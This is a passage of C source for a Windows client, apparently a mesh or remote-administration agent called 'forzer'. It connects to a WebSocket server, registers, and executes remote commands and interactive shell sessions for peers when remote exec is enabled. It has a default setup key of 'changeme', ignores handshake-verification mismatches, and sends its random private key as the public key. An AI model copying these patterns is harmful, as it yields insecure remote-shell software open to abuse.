        fprintf(stderr, "error: WSAStartup failed\n");
        return 1;
    }

    int is_wss = (strncmp(url, "wss://", 6) == 0);
    if (!is_wss && strncmp(url, "ws://", 5) != 0) {
        fprintf(stderr, "error: only ws:// and wss:// supported\n");
        WSACleanup();
        return 1;
    }
    const char *auth = url + (is_wss ? 6 : 5);

    char host[256] = {0}, path[512] = {0};
    const char *slash = strchr(auth, '/');
    const char *colon = strchr(auth, ':');
    int port = is_wss ? 443 : 80;
    if (colon && (!slash || colon < slash)) {
        int hl = (int)(colon - auth);
        if (hl >= sizeof(host)) hl = sizeof(host) - 1;
        memcpy(host, auth, hl);
        port = atoi(colon + 1);
        if (slash) {
            int pl = (int)strlen(slash);
            if (pl >= sizeof(path)) pl = sizeof(path) - 1;
            memcpy(path, slash, pl);
        } else {
            path[0] = '/';
        }
    } else {
        int hl = slash ? (int)(slash - auth) : (int)strlen(auth);
        if (hl >= sizeof(host)) hl = sizeof(host) - 1;
        memcpy(host, auth, hl);
        if (slash) {
            int pl = (int)strlen(slash);
            if (pl >= sizeof(path)) pl = sizeof(path) - 1;
            memcpy(path, slash, pl);
        } else {
            path[0] = '/';
        }
    }
    if (path[0] == 0) path[0] = '/';

    printf("connecting to %s:%d%s (%s)\n", host, port, path, is_wss ? "wss" : "ws");

    if (is_wss) {
        if (tls_handshake(host, port) != 0) {
            fprintf(stderr, "error: tls handshake failed\n");
            WSACleanup();
            return 1;
        }
    } else {
        struct addrinfo hints, *res = NULL;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        char portstr[16];
        snprintf(portstr, sizeof(portstr), "%d", port);
        if (getaddrinfo(host, portstr, &hints, &res) != 0) {
            fprintf(stderr, "error: cannot resolve %s\n", host);
            WSACleanup();
            return 1;
        }
        SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (s == INVALID_SOCKET) {
            fprintf(stderr, "error: socket() failed\n");
            freeaddrinfo(res);
            WSACleanup();
            return 1;
        }
        if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
            fprintf(stderr, "error: connect() failed (%d)\n", WSAGetLastError());
            closesocket(s);
            freeaddrinfo(res);
            WSACleanup();
            return 1;
        }
        freeaddrinfo(res);
        g_sock = s;
    }

    /* --- WebSocket HTTP upgrade (shared by ws and wss) --- */
    BYTE keyb[16];
    rng_bytes(keyb, 16);
    char keyb64[32];
    base64(keyb, 16, keyb64);
    char req[512];
    snprintf(req, sizeof(req),
             "GET %s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\n"
             "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
             "Sec-WebSocket-Version: 13\r\n\r\n",
             path, host, port, keyb64);
    if (g_use_tls) {
        if (!tls_send(req, (int)strlen(req))) {
            fprintf(stderr, "error: handshake send failed\n");
            WSACleanup();
            return 1;
        }
    } else {
        if (!sock_send_all(g_sock, req, (int)strlen(req))) {
            fprintf(stderr, "error: handshake send failed\n");
            WSACleanup();
            return 1;
        }
    }

    char resp[1024];
    int rl = 0, r;
    while (rl < (int)sizeof(resp) - 1) {
        r = g_use_tls ? tls_recv(resp + rl, 1) : recv(g_sock, resp + rl, 1, 0);
        if (r <= 0) break;
        rl += r;
        if (rl >= 4 && resp[rl - 4] == '\r' && resp[rl - 3] == '\n' &&
            resp[rl - 2] == '\r' && resp[rl - 1] == '\n')
            break;
    }
    resp[rl] = 0;
    if (strstr(resp, "101") == NULL) {
        fprintf(stderr, "error: handshake failed:\n%s\n", resp);
        WSACleanup();
        return 1;
    }
    char *acc = strstr(resp, "sec-websocket-accept:");
    if (acc) {
        acc = strchr(acc, ':') + 1;
        while (*acc == ' ') acc++;
        char server_acc[128] = {0};
        int i = 0;
        while (*acc && *acc != '\r' && *acc != '\n' && i < 127) server_acc[i++] = *acc++;
        char concat[64];
        snprintf(concat, sizeof(concat), "%s%s", keyb64, WS_GUID);
        BYTE hash[20];
        sha1((BYTE *)concat, (DWORD)strlen(concat), hash);
        char expect[64];
        base64(hash, 20, expect);
        if (_stricmp(server_acc, expect) != 0)
            printf("warning: server accept mismatch (continuing)\n");
    }

    printf("websocket connected\n");

    BYTE priv[32];
    rng_bytes(priv, 32);
    char pub_b64[64];
    base64(priv, 32, pub_b64);

    char reg[512];
    snprintf(reg, sizeof(reg),
             "{\"type\":\"register\",\"name\":\"%s\",\"pubkey\":\"%s\",\"setupKey\":\"%s\"}",
             name && *name ? name : "forzer", pub_b64,
             setup_key && *setup_key ? setup_key : "changeme");
    if (tr_send(reg, (int)strlen(reg)) <= 0) {
        fprintf(stderr, "error: register send failed\n");
        WSACleanup();
        return 1;
    }
    printf("sent register; waiting for server...\n");
    printf("(type 'run <peer-id> <command>' to execute on a peer)\n");

    HANDLE thr = CreateThread(NULL, 0, reader_thread, NULL, 0, NULL);

    char buf[131072];
    int reconnect = 0;
    for (;;) {
        int n = tr_recv(buf, sizeof(buf) - 1);
        if (n < 0) {
            printf("connection closed\n");
            reconnect = 1;
            break;
        }
        buf[n] = 0;
        char type[32] = {0};
        json_str(buf, "type", type, sizeof(type));
        char from[64] = {0};
        json_str(buf, "from", from, sizeof(from));
        if (strcmp(type, "registered") == 0) {
            char id[64] = {0}, ip[64] = {0}, err[128] = {0};
            json_str(buf, "id", id, sizeof(id));
            json_str(buf, "ip", ip, sizeof(ip));
            json_str(buf, "error", err, sizeof(err));
            if (err[0]) { fprintf(stderr, "register error: %s\n", err); break; }
            printf("registered: id=%s assigned-ip=%s\n", id, ip);
        } else if (strcmp(type, "map") == 0) {
            int count = 0;
            const char *p = strstr(buf, "\"peers\"");
            if (p) for (const char *q = strchr(p, '['); q && *q && *q != ']'; q++)
                if (*q == '{') count++;
            printf("map update: %d peer(s)\n", count);
            for_each_peer(buf, apply_peer);
        } else if (strcmp(type, "signal") == 0) {
            char from[64] = {0};
            json_str(buf, "from", from, sizeof(from));
            printf("[signal] from %s: %s\n", from, buf);
        } else if (strcmp(type, "command") == 0) {
            char from[64] = {0}, id[64] = {0}, cmd[8192] = {0};
            json_str(buf, "from", from, sizeof(from));
            json_str(buf, "id", id, sizeof(id));
            json_str(buf, "data", cmd, sizeof(cmd));
            if (!g_allow_remote) {
                printf("[command] REJECTED (remote exec disabled) from %s: %s\n", from, cmd);
                continue;
            }
            printf("[command] from %s: %s\n", from, cmd);
            static char out[32768];
            int rc = run_command(cmd, out, sizeof(out));
            char esc[66000];
            json_escape(out, esc, sizeof(esc));
            char res[68000];
            snprintf(res, sizeof(res),
                     "{\"type\":\"command-result\",\"to\":\"%s\",\"id\":\"%s\",\"data\":\"%s\",\"rc\":%d}",
                     from, id, esc, rc);
            tr_send(res, (int)strlen(res));
            printf("[command] done (rc=%d, %d bytes)\n", rc, (int)strlen(esc));
        } else if (strcmp(type, "term-start") == 0) {
            char id[64] = {0};
            json_str(buf, "id", id, sizeof(id));
            if (!g_allow_remote) {
                printf("[term] REJECTED (remote exec disabled)\n");
                continue;
            }
            printf("[term] start session %s\n", id);
            if (run_interactive(from, id) != 0)
                term_send("term-exit", "failed to start shell", (int)strlen("failed to start shell"), -1);
        } else if (strcmp(type, "term-input") == 0) {
            char data[32768] = {0};
            json_str(buf, "data", data, sizeof(data));
            /* data is base64 of the raw keystrokes */
            static unsigned char dec[22000];
            int dl = (int)strlen(data);
            int out = 0;
            for (int i = 0; i + 3 < dl; i += 4) {
                int v = 0;
                for (int k = 0; k < 4; k++) {
                    char c = data[i + k];
                    int val = -1;
                    if (c >= 'A' && c <= 'Z') val = c - 'A';
                    else if (c >= 'a' && c <= 'z') val = c - 'a' + 26;
                    else if (c >= '0' && c <= '9') val = c - '0' + 52;
                    else if (c == '+') val = 62;
                    else if (c == '/') val = 63;
                    else break; /* '=' padding */
                    v = (v << 6) | val;
                }
                dec[out++] = (unsigned char)((v >> 16) & 0xff);
                if (data[i+2] != '=') dec[out++] = (unsigned char)((v >> 8) & 0xff);
                if (data[i+3] != '=') dec[out++] = (unsigned char)(v & 0xff);
            }
            term_write_input((char *)dec, out);
        } else if (strcmp(type, "term-end") == 0) {
            printf("[term] session ended by viewer\n");
            term_stop();
        } else if (strcmp(type, "command-result") == 0) {
            char id[64] = {0}, data[32768] = {0}, rc[16] = {0};
            json_str(buf, "id", id, sizeof(id));
            json_str(buf, "data", data, sizeof(data));
            json_str(buf, "rc", rc, sizeof(rc));
            printf("RESULT (rc=%s):\n%s\n", rc, data);
        } else {
            printf("[msg] %s\n", buf);
        }
    }

    if (thr) {
        /* nudge the reader thread to exit, then reap */
        fclose(stdin);
        WaitForSingleObject(thr, 1000);
        CloseHandle(thr);
        thr = NULL;
    }

    term_stop(); /* kill any live shell session on disconnect */

    /* Tear down the current socket before (re)connecting. */
    if (g_use_tls) {
        DeleteSecurityContext(&g_ctx);
        FreeCredentialsHandle(&g_cred);
        if (g_tls_sock != INVALID_SOCKET) closesocket(g_tls_sock);
        g_tls_sock = INVALID_SOCKET;
        g_use_tls = 0;
        g_sock = INVALID_SOCKET;
        if (g_tls_in) { free(g_tls_in); g_tls_in = NULL; g_tls_in_len = g_tls_in_cap = 0; }
        if (g_tls_out) { free(g_tls_out); g_tls_out = NULL; g_tls_out_len = g_tls_out_off = 0; }
    } else {
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
    }

    if (reconnect) {
        /* Auto-reconnect with exponential backoff so a dropped link (idle
           timeout, transient network blip, server restart) doesn't end the
           tool. */
        int attempt = 0;
        for (;;) {
            attempt++;
            int delay = attempt < 6 ? (1 << attempt) : 60; /* 2,4,8,16,32,60s */
            printf("reconnecting in %d s (attempt %d)...\n", delay, attempt);
            Sleep(delay * 1000);
            /* Re-run connect+handshake+register from the top of connect_mode. */
            WSACleanup();
            return connect_mode(url, setup_key, name);
        }
    }
    if (g_use_tls) {
        DeleteSecurityContext(&g_ctx);
        FreeCredentialsHandle(&g_cred);
        if (g_tls_sock != INVALID_SOCKET) closesocket(g_tls_sock);
        g_tls_sock = INVALID_SOCKET;
        g_use_tls = 0;
        if (g_tls_in) { free(g_tls_in); g_tls_in = NULL; g_tls_in_len = g_tls_in_cap = 0; }
        if (g_tls_out) { free(g_tls_out); g_tls_out = NULL; g_tls_out_len = g_tls_out_off = 0; }
    } else {
        closesocket(g_sock);
        g_sock = INVALID_SOCKET;
    }
    WSACleanup();
    return 0;
}

int main(int argc, char **argv) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--update") == 0 || strcmp(argv[i], "-u") == 0) {
            return do_update();
        }
    }

    const char *url = getenv("FORZER_SERVER");
    if (!url || !*url) url = DEFAULT_SERVER;
    const char *key = getenv("FORZER_SETUP_KEY");
    if (!key || !*key) key = "changeme";
    char name[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD nlen = sizeof(name);
    if (!GetComputerNameA(name, &nlen)) strcpy(name, "forzer");

    return connect_mode(url, key, name);
}
